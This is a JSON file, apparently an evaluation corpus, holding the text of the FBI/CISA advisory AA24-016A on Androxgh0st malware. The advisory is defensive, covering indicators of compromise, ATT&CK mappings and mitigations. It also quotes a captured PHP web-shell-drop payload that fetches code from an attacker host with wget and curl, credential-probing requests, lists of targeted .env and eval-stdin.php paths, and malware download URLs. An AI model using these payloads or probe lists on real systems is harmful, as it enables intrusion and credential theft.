@@ -1,0 +1,342 @@
+[
+ {
+  "id": "p1",
+  "text": "# Known Indicators of Compromise Associated with Androxgh0st Malware"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: FBI Internet Crime Complaint Center (IC3), CSA listing — advisory id AA24-016A\n> - Date: 2024-01-16\n> - URL: https://www.ic3.gov/CSA/2024/240116.pdf\n> - PDF SHA-256: 878931028d9e8f6338dd5a26d27ee776b520cde8b3b733c3b92983fecf5cbcce (`source.pdf`, 13 pages)\n> - License: U.S. Government work (public domain)\n> - Text: `pdftotext -layout` output; only page furniture removed by `reports/eval/build_corpus.py` (25 lines). No other edits."
+ },
+ {
+  "id": "p3",
+  "text": "Co-Authored by:                                                                          TLP:CLEAR            Product ID: AA24-016A\n                                                                                                                   January 16, 2024"
+ },
+ {
+  "id": "p4",
+  "text": "Known Indicators of Compromise Associated\n        with Androxgh0st Malware\n        SUMMARY                                                             Actions to take today to mitigate\n                                                                            malicious cyber activity:\n        The Federal Bureau of Investigation (FBI) and the\n        Cybersecurity and Infrastructure Security Agency (CISA)             •   Prioritize patching known exploited\n        are releasing this joint Cybersecurity Advisory (CSA) to                vulnerabilities in internet-facing\n        disseminate known indicators of compromise (IOCs) and                   systems.\n        tactics, techniques, and procedures (TTPs) associated               •   Review and ensure only necessary\n        with threat actors deploying Androxgh0st malware.                       servers and services are exposed to\n        Multiple, ongoing investigations and trusted third party                the internet.\n        reporting yielded the IOCs and TTPs, and provided                   •   Review platforms or services that\n        information on Androxgh0st malware’s ability to                         have credentials listed in .env files\n        establish a botnet that can further identify and                        for unauthorized access or use.\n        compromise vulnerable networks.\n        The FBI and CISA encourage organizations to implement the recommendations in the Mitigations\n        section of this CSA to reduce the likelihood and impact of cybersecurity incidents caused by\n        Androxgh0st infections.\n        For a downloadable copy of IOCs, see:\n             •    AA24-016A (STIX XML, 46KB)\n             •    AA24-016A (STIX JSON, 40KB)"
+ },
+ {
+  "id": "p5",
+  "text": "TECHNICAL DETAILS\n        Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE\n        ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE\n        ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations."
+ },
+ {
+  "id": "p6",
+  "text": "To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact\n        your local FBI field office at fbi.gov/contact-us/field-offices. When available, please include the following\n        information regarding the incident: date, time, and location of the incident; type of activity; number of people\n        affected; type of equipment used for the activity; the name of the submitting company or organization; and a\n        designated point of contact. To request incident response resources or technical assistance related to these\n        threats, contact CISA at report@cisa.dhs.gov.\n        This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information\n        carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public\n        release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction.\n        For more information on the Traffic Light Protocol, see cisa.gov/tlp/."
+ },
+ {
+  "id": "p7",
+  "text": "TLP:CLEAR                                                                                                  FBI | CISA"
+ },
+ {
+  "id": "p8",
+  "text": "For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA\n       and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool."
+ },
+ {
+  "id": "p9",
+  "text": "Overview\n       Androxgh0st malware has been observed establishing a botnet [T1583.005] for victim identification\n       and exploitation in target networks. According to open source reporting[1], Androxgh0st is a Python-\n       scripted malware [T1059.006] primarily used to target .env files that contain confidential information,\n       such as credentials [T1552.001] for various high profile applications (i.e., Amazon Web Services\n       [AWS], Microsoft Office 365, SendGrid, and Twilio from the Laravel web application framework).\n       Androxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer\n       Protocol (SMTP), such as scanning [T1046] and exploiting exposed credentials [T1078] and\n       application programming interfaces (APIs) [T1114], and web shell deployment [T1505.003]."
+ },
+ {
+  "id": "p10",
+  "text": "Targeting the PHPUnit\n       Androxgh0st malware TTPs commonly involves the use of scripts, conducting scanning [T1595] and\n       searching for websites with specific vulnerabilities. In particular, threat actors deploying Androxgh0st\n       have been observed exploiting CVE-2017-9841 to remotely run hypertext preprocessor (PHP) code\n       on fallible websites via PHPUnit [T1190]. Websites using the PHPUnit module that have internet-\n       accessible (exposed) /vendor folders are subject to malicious HTTP POST requests to the\n       /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php uniform resource identifier (URI). This\n       PHP page runs PHP code submitted through a POST request, which allows the threat actors to\n       remotely execute code.\n       Malicious actors likely use Androxgh0st to download malicious files [T1105] to the system hosting the\n       website. Threat actors are further able to set up a fake (illegitimate) page accessible via the URI to\n       provide backdoor access to the website. This allows threat actors to download additional malicious\n       files for their operations and access databases."
+ },
+ {
+  "id": "p11",
+  "text": "Laravel Framework Targeting\n       Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application\n       framework. After identifying websites using the Laravel web application, threat actors attempt to\n       determine if the domain’s root-level .env file is exposed and contains credentials for accessing\n       additional services. Note: .env files commonly store credentials and tokens. Threat actors often\n       target .env files to steal these credentials within the environment variables.\n       If the .env file is exposed, threat actors will issue a GET request to the /.env URI to attempt to\n       access the data on the page. Alternatively, Androxgh0st may issue a POST request to the same URI\n       with a POST variable named 0x[] containing certain data sent to the web server. This data is\n       frequently used as an identifier for the threat actor. This method appears to be used for websites in\n       debug mode (i.e., when non-production websites are exposed to the internet). A successful response\n       from either of these methods allows the threat actors to look for usernames, passwords, and/or other\n       credentials pertaining to services such as email (via SMTP) and AWS accounts."
+ },
+ {
+  "id": "p12",
+  "text": "TLP:CLEAR                                                                                                  FBI | CISA"
+ },
+ {
+  "id": "p13",
+  "text": "Androxgh0st malware can also access the application key [TA0006] for the Laravel application on the\n       website. If the threat actors successfully identify the Laravel application key, they will attempt\n       exploitation by using the key to encrypt PHP code [T1027.010]. The encrypted code is then passed to\n       the website as a value in the cross-site forgery request (XSRF) token cookie, XSRF-TOKEN, and\n       included in a future GET request to the website. The vulnerability defined in CVE-2018-15133\n       indicates that on Laravel applications, XSRF token values are subject to an un-serialized call, which\n       can allow for remote code execution. In doing so, the threat actors can upload files to the website via\n       remote access."
+ },
+ {
+  "id": "p14",
+  "text": "Apache Web Server Targeting\n       In correlation with CVE-2021-41773, Androxgh0st actors have been observed scanning vulnerable\n       web servers [T1595.002] running Apache HTTP Server versions 2.4.49 or 2.4.50. Threat actors can\n       identify uniform resource locators (URLs) for files outside root directory through a path traversal\n       attack [T1083]. If these files are not protected by the “request all denied” configuration and Common\n       Gateway Interface (CGI) scripts are enabled, this may allow for remote code execution.\n       If threat actors obtain credentials for any services using the above methods, they may use these\n       credentials to access sensitive data or use these services to conduct additional malicious operations.\n       For example, when threat actors successfully identify and compromise AWS credentials from a\n       vulnerable website, they have been observed attempting to create new users and user policies\n       [T1136]. Additionally, Andoxgh0st actors have been observed creating new AWS instances to use for\n       conducting additional scanning activity [T1583.006]."
+ },
+ {
+  "id": "p15",
+  "text": "INDICATORS OF COMPROMISE (IOCs)\n       Based on investigations and analysis, the following requests are associated with Androxgh0st activity:\n           •    Incoming GET and POST requests to the following URIs:\n                o /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n                o /.env\n           •    Incoming POST requests with the following strings:\n                o [0x%5B%5D=androxgh0st]\n                o ImmutableMultiDict([('0x[]', 'androxgh0st')])\n       In both previously listed POST request strings, the name androxgh0st has been observed to be\n       replaced with other monikers.\n       Additional URIs observed by the FBI and a trusted third party used by these threat actors for\n       credential exfiltration include:\n           •    /info\n           •    /phpinfo\n           •    /phpinfo.php\n           •    /?phpinfo=1\n           •    /frontend_dev.php/$\n           •    /_profiler/phpinfo"
+ },
+ {
+  "id": "p16",
+  "text": "TLP:CLEAR                                                                                                   FBI | CISA"
+ },
+ {
+  "id": "p17",
+  "text": "•    /debug/default/view?panel=config\n           •    /config.json\n           •    /.json\n           •    /.git/config\n           •    /live_env\n           •    /.env.dist\n           •    /.env.save\n           •    /environments/.env.production\n           •    /.env.production.local\n           •    /.env.project\n           •    /.env.development\n           •    /.env.production\n           •    /.env.prod\n           •    /.env.development.local\n           •    /.env.old\n           •    /<insert-directory>/.env\n                o Note: the actor may attempt multiple different potential URI endpoints scanning for the\n                   .env file, for example /docker/.env or /local/.env.\n           •    /.aws/credentials\n           •    /aws/credentials\n           •    /.aws/config\n           •    /.git\n           •    /.test\n           •    /admin\n           •    /backend\n           •    /app\n           •    /current\n           •    /demo\n           •    /api\n           •    /backup\n           •    /beta\n           •    /cron\n           •    /develop\n           •    /Laravel\n           •    /laravel/core\n           •    /gists/cache\n           •    /test.php\n           •    /info.php\n           •    //.env\n           •    /admin-app/.env%20"
+ },
+ {
+  "id": "p18",
+  "text": "TLP:CLEAR                                                                                FBI | CISA"
+ },
+ {
+  "id": "p19",
+  "text": "•    /laravel/.env%20\n           •    /shared/.env%20\n           •    /.env.project%20\n           •    /apps/.env%20\n           •    /development/.env%20\n           •    /live_env%20\n           •    /.env.development%20\n       Targeted URIs for web-shell drop:\n           •    /.env/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //lib/phpunit/phpunit/Util/PHP/eval-stdin.php\n           •    //lib/phpunit/src/Util/PHP/eval-stdin.php\n           •    //lib/phpunit/Util/PHP/eval-stdin.php\n           •    //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //phpunit/phpunit/Util/PHP/eval-stdin.php\n           •    //phpunit/src/Util/PHP/eval-stdin.php\n           •    //phpunit/Util/PHP/eval-stdin.php\n           •    //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/evalstd\n                in.php\n           •    //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php\n           •    //vendor/phpunit/src/Util/PHP/eval-stdin.php\n           •    //vendor/phpunit/Util/PHP/eval-stdin.php\n           •    //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-\n                stdin.php\n           •    //wp-content/plugins/dzs-\n                videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+ },
+ {
+  "id": "p20",
+  "text": "TLP:CLEAR                                                                                FBI | CISA"
+ },
+ {
+  "id": "p21",
+  "text": "•    //wp-content/plugins/jekyll-\n                exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //wp-content/plugins/mm-\n                plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php\n           •    /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php\n           •    /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /lib/phpunit/phpunit/Util/PHP/eval-stdin.php\n           •    /lib/phpunit/phpunit/Util/PHP/eval\n           •    stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php\n           •    /lib/phpunit/src/Util/PHP/eval-stdin.php\n           •    /lib/phpunit/Util/PHP/eval-stdin.php\n           •    /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /phpunit/phpunit/Util/PHP/eval-stdin.php\n           •    /phpunit/phpunit/Util/PHP/eval-\n                stdin.php%20/phpunit/src/Util/PHP/evalstdin.php\n           •    /phpunit/src/Util/PHP/eval-stdin.php\n           •    ./phpunit/Util/PHP/eval-stdin.php\n           •    /phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval-\n                stdin.php\n           •    /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.dev\n           •    /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php\n           •    /vendor/phpunit/phpunit/Util/PHP/eval-\n                stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php\n           •    /vendor/phpunit/src/Util/PHP/eval-stdin.php\n           •    /vendor/phpunit/Util/PHP/eval-stdin.php\n           •    /vendor/phpunit/Util/PHP/eval-stdin.php%20\n           •    /phpunit/phpunit/src/Util/PHP/eval-stdin.php\n           •    /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+ },
+ {
+  "id": "p22",
+  "text": "TLP:CLEAR                                                                                    FBI | CISA"
+ },
+ {
+  "id": "p23",
+  "text": "•    /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n       An example of attempted credential exfiltration through (honeypot) open proxies:\n       POST /.aws/credentials HTTP/1.1\n       host: www.example.com\n       user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like\n       Gecko) Chrome/81.0.4044.129 Safari/537.36\n       accept-encoding: gzip, deflate\n       accept: */*\n       connection: keep-alive\n       content-length: 20\n       content-type: application/x-www-form-urlencoded"
+ },
+ {
+  "id": "p24",
+  "text": "0x%5B%5D=androxgh0st\n       An example of attempted web-shell drop through (honeypot) open proxies:\n       GET http://www.example.com/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n       HTTP/1.1\n       host: www.example.com\n       user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,\n       like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76\n       accept-encoding: gzip, deflate\n       accept: */*\n       connection: keep-alive\n       x-forwarded-for: 200.172.238.135\n       content-length: 279"
+ },
+ {
+  "id": "p25",
+  "text": "<?php\n       file_put_contents('evil.php',file_get_contents('hxxps://mc.rockylinux[.]si/seofor\n       ce/triggers/files/evil.txt')); system('wget\n       hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php;curl\n       hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php'); ?>\n       Monikers used instead of Androxgh0st (0x%5B%5D=???):\n           •    Ridho\n           •    Aws\n           •    0x_0x\n           •    x_X\n           •    nopebee7\n           •    SMTPEX\n           •    evileyes0\n           •    privangga"
+ },
+ {
+  "id": "p26",
+  "text": "TLP:CLEAR                                                                             FBI | CISA"
+ },
+ {
+  "id": "p27",
+  "text": "•    drcrypter\n           •    errorcool\n           •    drosteam\n           •    androxmen\n           •    crack3rz\n           •    b4bbyghost\n           •    0x0day\n           •    janc0xsec\n           •    blackb0x\n           •    0x1331day\n           •    Graber\n       Example malware drops through eval-stdin.php:\n       hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt\n       59e90be75e51c86b4b9b69dcede2cf815da5a79f7e05cac27c95ec35294151f4"
+ },
+ {
+  "id": "p28",
+  "text": "hxxps://chainventures.co[.]uk/.well-known/aas\n       dcf8f640dd7cc27d2399cce96b1cf4b75e3b9f2dfdf19cee0a170e5a6d2ce6b6"
+ },
+ {
+  "id": "p29",
+  "text": "hxxp://download.asyncfox[.]xyz/download/xmrig.x86_64\n       23fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066"
+ },
+ {
+  "id": "p30",
+  "text": "hxxps://pastebin[.]com/raw/zw0gAmpC\n       ca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72"
+ },
+ {
+  "id": "p31",
+  "text": "hxxp://raw.githubusercontent[.]com/0x5a455553/MARIJUANA/master/MARIJUANA.php\n       0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317ef"
+ },
+ {
+  "id": "p32",
+  "text": "hxxp://45.95.147[.]236/tmp.x86_64\n       6b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbc"
+ },
+ {
+  "id": "p33",
+  "text": "hxxp://main.dsn[.]ovh/dns/pwer\n       bb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7"
+ },
+ {
+  "id": "p34",
+  "text": "hxxp://tangible-drink.surge[.]sh/configx.txt\n       de1114a09cbab5ae9c1011ddd11719f15087cc29c8303da2e71d861b0594a1ba\n       Generic file managers dropped through eval-stdin.php\n       hxxps://github[.]com/alexantr/filemanager\n       hxxps://github[.]com/prasathmani/tinyfilemanager"
+ },
+ {
+  "id": "p35",
+  "text": "TLP:CLEAR                                                                                                           FBI | CISA"
+ },
+ {
+  "id": "p36",
+  "text": "MITRE ATT&CK TACTICS AND TECHNIQUES\n       See Tables 1-10 for all referenced threat actor tactics and techniques in this advisory.\n                                                      Table 1: Reconnaissance"
+ },
+ {
+  "id": "p37",
+  "text": "Technique Title                ID                                       Use"
+ },
+ {
+  "id": "p38",
+  "text": "Active Scanning:\n                                                    The threat actor scans websites for specific vulnerabilities\n        Vulnerability                  T1595.002\n                                                    to exploit.\n        Scanning"
+ },
+ {
+  "id": "p39",
+  "text": "Table 2: Resource Development"
+ },
+ {
+  "id": "p40",
+  "text": "Technique Title                ID                                       Use"
+ },
+ {
+  "id": "p41",
+  "text": "Acquire\n                                                    The threat actor establishes a botnet to identify and exploit\n        Infrastructure:                T1583.005\n                                                    victims.\n        Botnet"
+ },
+ {
+  "id": "p42",
+  "text": "Acquire\n                                                    The threat actor creates new AWS instances to use for\n        Infrastructure: Web            T1583.006\n                                                    scanning.\n        Services"
+ },
+ {
+  "id": "p43",
+  "text": "Table 3: Initial Access"
+ },
+ {
+  "id": "p44",
+  "text": "Technique Title                ID                                       Use"
+ },
+ {
+  "id": "p45",
+  "text": "The threat actor exploits CVE-2017-9841 to remotely run\n        Exploit Public-\n                                        T1190       hypertext preprocessor (PHP) code on websites via\n        Facing Application\n                                                    PHPUnit."
+ },
+ {
+  "id": "p46",
+  "text": "Table 4: Execution"
+ },
+ {
+  "id": "p47",
+  "text": "Technique Title                ID                                       Use"
+ },
+ {
+  "id": "p48",
+  "text": "Command and\n                                                    The threat actor uses Androxgh0st, a Python-scripted\n        Scripting Interpreter:         T1059.006\n                                                    malware, to target victim files.\n        Python"
+ },
+ {
+  "id": "p49",
+  "text": "TLP:CLEAR                                                                                                           FBI | CISA"
+ },
+ {
+  "id": "p50",
+  "text": "Table 5: Persistence"
+ },
+ {
+  "id": "p51",
+  "text": "Technique Title                 ID                                     Use"
+ },
+ {
+  "id": "p52",
+  "text": "The threat actor abuses the simple mail transfer protocol\n        Valid Accounts                   T1078\n                                                    (SMTP) by exploiting exposed credentials."
+ },
+ {
+  "id": "p53",
+  "text": "Server Software\n                                                    The threat actor deploys web shells to maintain persistent\n        Component: Web                  T1505.003\n                                                    access to systems.\n        Shell"
+ },
+ {
+  "id": "p54",
+  "text": "The threat actor attempts to create new users and user\n        Create Account                   T1136      policies with compromised AWS credentials from a\n                                                    vulnerable website."
+ },
+ {
+  "id": "p55",
+  "text": "Table 6: Defense Evasion"
+ },
+ {
+  "id": "p56",
+  "text": "Technique Title                 ID                                     Use"
+ },
+ {
+  "id": "p57",
+  "text": "Obfuscated Files or\n                                                    The threat actor can exploit a successfully identified\n        Information:\n                                    T1027.010       Laravel application key to encrypt PHP code, which is then\n        Command\n                                                    passed to the site as a value in the XSRF-TOKEN cookie.\n        Obfuscation"
+ },
+ {
+  "id": "p58",
+  "text": "Table 7: Credential Access"
+ },
+ {
+  "id": "p59",
+  "text": "Technique Title                 ID                                     Use"
+ },
+ {
+  "id": "p60",
+  "text": "The threat actor can access the application key of the\n        Credential Access                TA0006\n                                                    Laravel application on the site."
+ },
+ {
+  "id": "p61",
+  "text": "Unsecured\n                                                    The threat actor targets .env files that contain confidential\n        Credentials:                T1552.001\n                                                    credential information.\n        Credentials in Files"
+ },
+ {
+  "id": "p62",
+  "text": "Table 8: Discovery"
+ },
+ {
+  "id": "p63",
+  "text": "Technique Title                 ID                                     Use"
+ },
+ {
+  "id": "p64",
+  "text": "File and Directory                           The threat actor can identify URLs for files outside root\n                                          T1083\n        Discovery                                    directory through a path traversal attack."
+ },
+ {
+  "id": "p65",
+  "text": "TLP:CLEAR                                                                                                      FBI | CISA"
+ },
+ {
+  "id": "p66",
+  "text": "Technique Title               ID                                     Use"
+ },
+ {
+  "id": "p67",
+  "text": "Network Service                           The threat actor uses Androxgh0st to abuse simple mail\n                                        T1046\n        Discovery                                 transfer protocol (SMTP) via scanning."
+ },
+ {
+  "id": "p68",
+  "text": "Table 9: Collection"
+ },
+ {
+  "id": "p69",
+  "text": "Technique Title               ID                                     Use"
+ },
+ {
+  "id": "p70",
+  "text": "The threat actor interacts with application programming\n        Email Collection                T1114\n                                                 interfaces (APIs) to gather information."
+ },
+ {
+  "id": "p71",
+  "text": "Table 10: Command and Control"
+ },
+ {
+  "id": "p72",
+  "text": "Technique Title               ID                                     Use"
+ },
+ {
+  "id": "p73",
+  "text": "Ingress Tool                             The threat actor runs PHP code through a POST request to\n                                        T1105\n        Transfer                                 download malicious files to the system hosting the website."
+ },
+ {
+  "id": "p74",
+  "text": "MITIGATIONS\n       The FBI and CISA recommend implementing the mitigations below to improve your organization’s\n       cybersecurity posture based on Androxgh0st threat actor activity. These mitigations align with the\n       Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute\n       of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections\n       that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on\n       existing cybersecurity frameworks and guidance to protect against the most common and impactful\n       threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance\n       Goals for more information on the CPGs, including additional recommended baseline protections.\n       These mitigations apply to all critical infrastructure organizations and network defenders. FBI and\n       CISA recommend that software manufacturers incorporate secure by design principles and tactics\n       into their software development practices, limiting the impact of actor techniques and strengthening\n       their customers’ security posture. For more information on secure by design, see CISA’s Secure by\n       Design webpage.\n       The FBI and CISA recommend network defenders apply the following mitigations to limit potential\n       adversarial use of common system and network discovery techniques and to reduce the risk of\n       compromise by actors using Androxgh0st malware.\n           •    Keep all operating systems, software, and firmware up to date. Specifically, ensure that\n                Apache servers are not running versions 2.4.49 or 2.4.50. Timely patching is one of the\n                most efficient and cost-effective steps an organization can take to minimize its exposure to"
+ },
+ {
+  "id": "p75",
+  "text": "TLP:CLEAR                                                                                                    FBI | CISA"
+ },
+ {
+  "id": "p76",
+  "text": "cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing\n                systems.\n           •    Verify that the default configuration for all URIs is to deny all requests unless there is a\n                specific need for it to be accessible.\n           •    Ensure that any live Laravel applications are not in “debug” or testing mode. Remove\n                all cloud credentials from .env files and revoke them. All cloud providers have safer\n                ways to provide temporary, frequently rotated credentials to code running inside a web\n                server without storing them in any file.\n           •    On a one-time basis for previously stored cloud credentials, and on an on-going basis\n                for other types of credentials that cannot be removed, review any platforms or services\n                that have credentials listed in the .env file for unauthorized access or use.\n           •    Scan the server’s file system for unrecognized PHP files, particularly in the root directory\n                or /vendor/phpunit/phpunit/src/Util/PHP folder.\n           •    Review outgoing GET requests (via cURL command) to file hosting sites such as\n                GitHub, pastebin, etc., particularly when the request accesses a .php file."
+ },
+ {
+  "id": "p77",
+  "text": "VALIDATE SECURITY CONTROLS\n       In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your\n       organization's security program against the threat behaviors mapped to the MITRE ATT&CK for\n       Enterprise framework in this advisory. The authoring agencies recommend testing your existing\n       security controls inventory to assess how they perform against the ATT&CK techniques described in\n       this advisory.\n       To get started:\n           1. Select an ATT&CK technique described in this advisory (see Tables 1-10).\n           2. Align your security technologies against the technique.\n           3. Test your technologies against the technique.\n           4. Analyze your detection and prevention technologies’ performance.\n           5. Repeat the process for all security technologies to obtain a set of comprehensive performance\n              data.\n           6. Tune your security program, including people, processes, and technologies, based on the\n              data generated by this process.\n       FBI and CISA recommend continually testing your security program, at scale, in a production\n       environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this\n       advisory."
+ },
+ {
+  "id": "p78",
+  "text": "REPORTING\n       The FBI encourages organizations to report information concerning suspicious or criminal activity to\n       their local FBI field office. With regards to specific information that appears in this CSA, indicators\n       should always be evaluated in light of an organization’s complete security situation."
+ },
+ {
+  "id": "p79",
+  "text": "TLP:CLEAR                                                                                                  FBI | CISA"
+ },
+ {
+  "id": "p80",
+  "text": "When available, each report submitted should include the date, time, location, type of activity, number\n       of people, and type of equipment used for the activity, the name of the submitting company or\n       organization, and a designated point of contact. Reports can be submitted to the FBI Internet Crime\n       Complaint Center (IC3), a local FBI Field Office, or to CISA via its Incident Reporting System or its\n       24/7 Operations Center at report@cisa.gov or (888) 282-0870."
+ },
+ {
+  "id": "p81",
+  "text": "RESOURCES\n           •    CISA: Known Exploited Vulnerabilities Catalog\n           •    CISA, MITRE: Best Practices for MITRE ATT&CK Mapping\n           •    CISA: Decider Tool\n           •    NIST: CVE-2017-9841\n           •    NIST: CVE-2018-15133\n           •    NIST: CVE-2021-41773\n           •    CISA: Cross-Sector Cybersecurity Performance Goals\n           •    CISA: Secure by Design"
+ },
+ {
+  "id": "p82",
+  "text": "REFERENCES\n       [1] Fortinet - FortiGuard Labs: Threat Signal Report: AndroxGh0st Malware Actively Used in the Wild"
+ },
+ {
+  "id": "p83",
+  "text": "ACKNOWLEDGEMENTS\n       Amazon contributed to this CSA."
+ },
+ {
+  "id": "p84",
+  "text": "DISCLAIMER\n       The information in this report is being provided “as is” for informational purposes only. FBI and CISA\n       do not endorse any commercial entity, product, company, or service, including any entities, products,\n       or services linked within this document. Any reference to specific commercial entities, products,\n       processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or\n       imply endorsement, recommendation, or favoring by FBI and CISA."
+ },
+ {
+  "id": "p85",
+  "text": "VERSION HISTORY\n       January 16, 2024: Initial version."
+ }
+]
